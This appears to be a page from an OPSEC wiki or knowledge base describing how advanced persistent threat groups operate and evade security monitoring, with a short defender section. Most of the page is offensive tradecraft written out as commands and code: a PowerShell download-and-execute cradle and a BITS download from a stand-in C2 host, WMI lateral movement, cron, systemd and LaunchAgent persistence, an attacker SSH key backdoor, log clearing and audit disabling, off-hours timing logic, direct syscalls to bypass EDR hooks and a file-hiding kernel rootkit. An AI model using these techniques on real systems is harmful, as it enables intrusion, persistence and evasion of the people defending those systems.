# APT Operations & SOC Evasion

## Overview

Advanced Persistent Threat (APT) groups represent the apex of operational security. This layer analyzes **how sophisticated adversaries operate with strong OPSEC while evading modern detection systems** (SOC, SIEM, EDR, ML-based analytics).

**Threat Model:** Nation-state actors, intelligence agencies, Tier 3-3.5 adversaries with operational discipline, advanced tooling, and long-term persistence objectives.

---

## I. APT Operational Patterns

### 1.1 Living Off The Land (LOTL)

**Principle:** Use built-in OS tools, not custom malware. Blend with legitimate activity.

**Cross-Platform Primitives:**

**Windows:**
```powershell
# PowerShell script-based operations (fileless)
IEX (New-Object Net.WebClient).DownloadString('http://c2.example.com/payload.ps1')

# WMI for lateral movement (native, no binaries)
wmic /node:TARGET process call create "cmd.exe /c payload.bat"

# Scheduled tasks for persistence
schtasks /create /tn "SystemUpdate" /tr "powershell.exe -File C:\Windows\Temp\task.ps1" /sc daily

# BITS for covert downloads
bitsadmin /transfer job /download /priority high http://c2.example.com/file.zip C:\Windows\Temp\file.zip
```

**Linux:**
```bash
# Cron for persistence
(crontab -l; echo "*/5 * * * * /tmp/.hidden/beacon.sh") | crontab -

# Systemd timer (harder to detect than cron)
cat > /etc/systemd/system/update-check.service <<EOF
[Unit]
Description=System Update Check
[Service]
ExecStart=/usr/local/bin/check_updates.sh
EOF

systemctl enable update-check.service

# SSH authorized_keys for backdoor
echo "ssh-rsa AAAAB3... attacker@c2" >> ~/.ssh/authorized_keys

# Preload library injection (LD_PRELOAD)
export LD_PRELOAD=/lib/x86_64-linux-gnu/libhook.so
```

**macOS:**
```bash
# LaunchAgent persistence
cat > ~/Library/LaunchAgents/com.apple.update.plist <<EOF
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN">
<plist version="1.0">
<dict>
    <key>Label</key>
    <string>com.apple.update</string>
    <key>ProgramArguments</key>
    <array>
        <string>/usr/local/bin/update_agent.sh</string>
    </array>
    <key>RunAtLoad</key>
    <true/>
</dict>
</plist>
EOF

launchctl load ~/Library/LaunchAgents/com.apple.update.plist
```

**Attribution Weight Analysis:**
- **V** = 0.5 (SOC logs capture, but ambiguous with legitimate admin activity)
- **R** = 0.9 (Logs retained in SIEM)
- **C** = 0.4 (Difficult to attribute without context)
- **AW** = 0.18 (LOW - blends with noise)

**Why It Works:** SOC analysts see thousands of legitimate PowerShell/bash executions daily. APTs don't stand out.

---

### 1.2 Instruction Set Polymorphism

**Principle:** Same functionality, different CPU instructions each execution. Defeats signature-based ML.

**x86-64 Instruction Variants:**
```asm
; Goal: Set RAX = 0

; Variant 1
xor rax, rax

; Variant 2
mov rax, 0

; Variant 3
sub rax, rax

; Variant 4
and rax, 0

; Variant 5
lea rax, [0]

; All functionally equivalent, but different opcodes
```

**Why This Matters:**
- ML models trained on static binary features (n-grams, opcode sequences)
- Polymorphic code changes signature every execution
- Requires **semantic analysis** (expensive, not real-time in SOC)

**APT Technique:**
```python
import random

def gen_nop_sled(length=100):
    """Generate polymorphic NOP sled"""
    nop_variants = [
        b'\x90',               # nop
        b'\x87\xc0',           # xchg eax, eax
        b'\x66\x90',           # 16-bit nop
        b'\x0f\x1f\x00',       # multi-byte nop
    ]
    return b''.join(random.choice(nop_variants) for _ in range(length))
```

**Attribution Weight:**
- **V** = 0.6 (Binary analysis tools detect anomaly)
- **R** = 0.7 (Samples archived)
- **C** = 0.3 (Difficult to cluster variants)
- **AW** = 0.13 (LOW)

---

## II. SOC/SIEM Evasion Techniques

### 2.1 Log Manipulation

**Windows Event Log Evasion:**
```powershell
# Disable specific event IDs (e.g., 4688 process creation)
auditpol /set /category:"Detailed Tracking" /success:disable

# Clear logs (noisy, but effective)
wevtutil cl Security
wevtutil cl Application

# Selective event deletion (surgical)
$events = Get-WinEvent -LogName Security | Where-Object {$_.Id -eq 4624 -and $_.TimeCreated -gt $OperationStart}
foreach ($event in $events) {
    # Delete specific events (requires admin)
}
```

**Linux Syslog Evasion:**
```bash
# Disable audit daemon
auditctl -e 0

# Clear logs selectively
> /var/log/auth.log
> /var/log/syslog

# Timestamp manipulation (make logs look older)
touch -t 202501010000 /var/log/auth.log
```

**Attribution Weight:**
- **V** = 0.9 (Log gaps detected by SOC)
- **R** = 0.8 (SIEM correlates missing logs)
- **C** = 0.9 (Clear indicator of compromise)
- **AW** = 0.65 (HIGH - suspicious, but operational)

**APT Approach:** Don't clear logs. **Blend with legitimate traffic volume.**

---

### 2.2 Timing-Based SOC Evasion

**Principle:** SOC analysts work business hours. Operate during off-hours.

**Optimal Windows:**
```
High-Risk Operations:
- 02:00-05:00 local time (skeleton crew)
- Weekends (reduced staffing)
- Holidays (minimal SOC presence)

Monitoring Pattern:
Mon-Fri 09:00-17:00: Full SOC (5-10 analysts)
Mon-Fri 17:00-09:00: Overnight (1-2 analysts)
Sat-Sun: Skeleton (0-1 analyst)
```

**Automated Timing:**
```python
from datetime import datetime

def is_soc_low_alert_period():
    """Check if current time is low-SOC-alert window"""
    now = datetime.now()
    
    # Weekend
    if now.weekday() >= 5:  # Saturday=5, Sunday=6
        return True
    
    # Overnight hours (02:00-05:00)
    if 2 <= now.hour <= 5:
        return True
    
    return False

# Operational flow
if is_soc_low_alert_period():
    execute_lateral_movement()
else:
    maintain_beacon_only()
```

**Attribution Weight:**
- **V** = 0.3 (Activity recorded, but reviewed later)
- **R** = 0.9 (Logs persist)
- **C** = 0.5 (Temporal pattern detectable over time)
- **AW** = 0.14 (LOW in short-term, MEDIUM long-term)

---

### 2.3 ML-Based Detection Evasion

**Threat:** Modern SOCs use ML for anomaly detection (Darktrace, Vectra, CrowdStrike ML modules).

**ML Model Weaknesses:**

**1. Adversarial Examples (Mimicry)**
```
Normal User Behavior:
- 50 PowerShell executions/day
- 200 network connections/day
- 10 file modifications/day

APT Mimicry:
- Execute 45-55 PowerShell commands (within 1σ of mean)
- 180-220 connections (blend with noise)
- 8-12 file mods (indistinguishable from legitimate)

Result: ML classifies as "normal" (false negative)
```

**2. Slow-and-Low (Temporal Evasion)**
```
Instead of:
- 1,000 files exfiltrated in 1 hour → ML ALERT

APT Approach:
- 10 files/day for 100 days → ML sees normal daily variance
```

**3. feature Pollution**
```python
# Generate decoy traffic to poison ML training data
import random
import time

def generate_decoy_traffic():
    """Create benign-looking traffic to confuse ML models"""
    for _ in range(1000):
        # Random legitimate-looking DNS queries
        domain = f"{random.choice(['api', 'cdn', 'static'])}.{random.choice(['google', 'microsoft', 'amazon'])}.com"
        dns_query(domain)
        time.sleep(random.uniform(1, 10))
```

**Attribution Weight:**
- **V** = 0.4 (ML captures features, but misclassifies)
- **R** = 0.9 (Training data retained)
- **C** = 0.3 (Difficult to cluster as malicious)
- **AW** = 0.11 (LOW)

---

## III. Cross-Platform Instruction-Level OPSEC

### 3.1 Syscall Direct Invocation (Bypassing EDR Hooks)

**Problem:** EDR (Endpoint Detection & Response) hooks user-space API calls.

**Solution:** Direct syscall invocation bypasses hooks.

**Windows (x86-64):**
```asm
; Syscall number for NtCreateFile
mov r10, rcx
mov eax, 0x55    ; Syscall number (varies by Windows version)
syscall
ret

; Bypasses hooks in kernel32.dll / ntdll.dll
```

**Linux:**
```c
#include <sys/syscall.h>
#include <unistd.h>

// Direct syscall (bypasses libc hooks)
long result = syscall(SYS_open, "/etc/passwd", O_RDONLY);

// vs. hooked libc function
// FILE *f = fopen("/etc/passwd", "r");  // EDR intercepts this
```

**Attribution Weight:**
- **V** = 0.7 (Kernel logs still capture, but EDR blind)
- **R** = 0.6 (Kernel logs less detailed)
- **C** = 0.6 (Behavioral anomaly, but not directly attributable)
- **AW** = 0.25 (MEDIUM - detectable by advanced SOC)

---

### 3.2 Instruction Set Obfuscation

**Control Flow Flattening:**
```c
// Before (clear control flow)
if (condition) {
    do_A();
} else {
    do_B();
}

// After (flattened, analysis-resistant)
int state = 0;
while (state != EXIT) {
    switch (state) {
        case 0:
            state = condition ? 1 : 2;
            break;
        case 1:
            do_A();
            state = EXIT;
            break;
        case 2:
            do_B();
            state = EXIT;
            break;
    }
}
```

**Opaque Predicates:**
```c
// Always true, but static analysis can't prove it
if ((x * x + y * y) >= 0) {  // Mathematically always true
    malicious_code();
}
```

**Attribution Weight:**
- **V** = 0.8 (Binary highly unusual)
- **R** = 0.9 (Samples archived)
- **C** = 0.4 (Difficult to attribute author)
- **AW** = 0.29 (MEDIUM)

---

## IV. Advanced Persistence Mechanisms

### 4.1 Bootkit / UEFI Implants

**Principle:** Persistence at firmware level, survives OS reinstall.

**Detection Difficulty:**
- **Traditional AV:** Cannot scan UEFI
- **EDR:** Operates above firmware layer
- **SOC:** Lacks telemetry from BIOS/UEFI

**Attribution Weight:**
- **V** = 0.3 (Requires specialized forensic tools)
- **R** = 1.0 (Persists until firmware reflash)
- **C** = 0.7 (High-sophistication indicator → APT attribution)
- **AW** = 0.21 (LOW immediate detection, but HIGH attribution if discovered)

**Mitigations:**
- Secure Boot with TPM
- UEFI firmware signing
- Regular firmware integrity checks (`chipsec`)

---

### 4.2 Kernel Module Rootkits

**Linux Example:**
```c
// Kernel module hooks syscalls
#include <linux/module.h>
#include <linux/syscalls.h>

asmlinkage long (*orig_open)(const char __user *, int, umode_t);

asmlinkage long hooked_open(const char __user *filename, int flags, umode_t mode) {
    // Log/modify behavior
    if (strstr(filename, "sensitive_file")) {
        return -ENOENT;  // Hide file
    }
    return orig_open(filename, flags, mode);
}

// Hide kernel module from lsmod
list_del_init(&__this_module.list);
```

**Attribution Weight:**
- **V** = 0.4 (Kernel-level analysis required)
- **R** = 0.9 (Memory forensics can recover)
- **C** = 0.8 (High-sophistication, strong APT indicator)
- **AW** = 0.29 (MEDIUM)

---

## V. APT-Specific Attribution Indicators

### 5.1 Operational Security Discipline

**Indicators APTs Follow OPSEC:**

1. **Infrastructure Burn Rate:** Rotate IPs/domains every 7-30 days
2. **Tooling Compartmentalization:** Separate tools per target
3. **Timing Discipline:** Activity only during target business hours (mimicry)
4. **No Reuse:** Zero infrastructure/credential overlap across campaigns
5. **Multi-Stage Payloads:** Only deploy next stage after recon confirms value

**Behavioral Clustering:**
```python
def detect_apt_operational_pattern(entity_data):
    """
    Detect if entity exhibits APT-level discipline
    """
    score = 0
    
    # Infrastructure turnover
    if entity_data['infrastructure_lifetime_days'] < 30:
        score += 20
    
    # No tool reuse
    if entity_data['unique_tools_per_campaign'] > 0.8:
        score += 20
    
    # Timing discipline
    if entity_data['activity_during_target_hours'] > 0.9:
        score += 20
    
    # Compartmentalization
    if entity_data['cross_campaign_overlap'] < 0.1:
        score += 20
    
    # Multi-stage deployment
    if entity_data['uses_multistage_payloads']:
        score += 20
    
    # Score > 70 = High-confidence APT
    return score >= 70
```

---

## VI. SOC Detection & Response

### 6.1 How SOCs Detect APT Operations

**Modern SOC Toolchain:**
```
SIEM (Splunk, QRadar)
  └─> Log Aggregation (Windows Event, Syslog, NetFlow)
      └─> Correlation Rules (Sigma rules, YARA)
          └─> ML Anomaly Detection (Darktrace, Vectra)
              └─> Threat Intel (MISP, ThreatConnect)
                  └─> Analyst Triage
```

**Kill Chain Correlation:**
```
Alert 1: Suspicious PowerShell (T1059.001)
Alert 2: Lateral Movement (T1021.002)
Alert 3: Data Staging (T1074.001)
Alert 4: Exfiltration (T1041)

SOC Analyst: "These 4 alerts within 2 hours → Investigate as APT"
```

**APT Evasion:** Spread activities across days/weeks. No temporal clustering.

---

### 6.2 Counter-Measures for Defenders

**Enhanced Telemetry:**
```powershell
# Enable advanced PowerShell logging
Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging" -Name "EnableScriptBlockLogging" -Value 1

# Sysmon (detailed process telemetry)
sysmon64.exe -accepteula -i sysmonconfig.xml

# Command-line auditing
auditpol /set /subcategory:"Process Creation" /success:enable
```

**Behavioral Analytics:**
```
Baseline Normal:
- User X: 10 PowerShell scripts/day, avg length 50 lines
- APT Anomaly: 50 scripts/day, avg length 500 lines

Alert: Deviation from baseline > 3 standard deviations
```

---

## VII. Quantitative Risk Assessment

### APT Operational OPSEC Score

**Formula:**
```
APT_OPSEC_Score = (Infrastructure_Turnover × Tool_Compartmentalization × Timing_Discipline × Anti-Forensics)

Where each factor: 0.0 (poor) → 1.0 (excellent)

Score > 0.7 = APT-level discipline
Score 0.4-0.7 = Sophisticated actor
Score < 0.4 = Low-sophistication
```

**Example:**
```
Infrastructure Turnover: 0.9 (burn every 14 days)
Tool Compartmentalization: 0.8 (unique per target)
Timing Discipline: 0.9 (only during business hours)
Anti-Forensics: 0.7 (some evasion, not perfect)

Score = 0.9 × 0.8 × 0.9 × 0.7 = 0.45 (Sophisticated)
```

---

## VIII. Operational Recommendations

### For Red Teams (Simulating APT)

1. **LOTL Everything:** PowerShell, WMI, bash, cron (no custom binaries)
2. **Slow Operations:** 5-10 files/day exfiltration (not 1,000/hour)
3. **Timing Mimicry:** Activity only 09:00-17:00 target timezone
4. **Infrastructure Burn:** Rotate every 7-14 days
5. **Zero Reuse:** New tools, IPs, domains per campaign

### For Blue Teams (Detecting APT)

1. **Baseline Everything:** User, system, network behavior
2. **Long-Term Correlation:** Look for patterns across weeks/months
3. **Anomaly Stacking:** Multiple low-confidence alerts → High confidence
4. **Hunt Proactively:** Don't wait for alerts, assume breach
5. **Threat Intel Integration:** Known APT TTPs → Detection rules

---

## IX. References

### Academic
- "APT28: At the Center of the Storm" (FireEye, 2014)
- "The Diamond Model of Intrusion Analysis" (Sergio Caltagirone, 2013)
- "Living Off The Land Binaries (LOLBAS)" (Oddvar Moe, 2018)

### Industry
- MITRE ATT&CK Framework (Tactics, Techniques, Procedures)
- NSA "Methodology for Adversary Emulation" (leaked documents)
- CrowdStrike "Adversary Tactics and TTPs" reports

### Tools
- Cobalt Strike (C2 framework, APT simulation)
- Sysmon (advanced Windows telemetry)
- HELK (Hunting ELK for threat detection)

---

**Related Layers:**
- [[Browser OPSEC]] - Client-side detection evasion
- [[AI-Augmented Attribution]] - How ML detects APTs
- [[Counter-AI OPSEC]] - Adversarial ML techniques

---

*Кто владеет информацией, тот владеет миром*

"APTs operate with discipline. Defenders must match it."

**The adversary is patient, persistent, and well-resourced. Detection requires equal diligence.**
